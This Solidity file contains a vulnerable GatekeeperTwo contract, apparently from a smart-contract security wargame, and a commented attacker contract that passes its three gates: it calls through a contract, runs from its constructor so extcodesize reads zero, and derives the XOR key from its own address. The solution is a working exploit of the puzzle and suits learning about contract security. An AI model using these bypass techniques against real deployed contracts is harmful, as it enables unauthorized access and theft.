// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly { x := extcodesize(caller()) }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract GatekeeperTwoAttacker {
    // gate 1 is passed by using a smart contract to call enter() instead of metamask address

    constructor(address _contractAddress) {
        // gate 3 is passed by using the XOR operator on this contract's address.
        // If A ^ B = C then A ^ C = B, so we just need to XOR by the right side of the equation to get the key
        uint64 _gateKey = type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this)))));

        GatekeeperTwo gatekeeper = GatekeeperTwo(_contractAddress);

        // gate 2 is passed by calling enter() inside the constructor. 
        // extcodesize registers as zero inside the constructor(because it's still creating the contract, so the contract's size is unknown)
        gatekeeper.enter(bytes8(_gateKey));
    }
}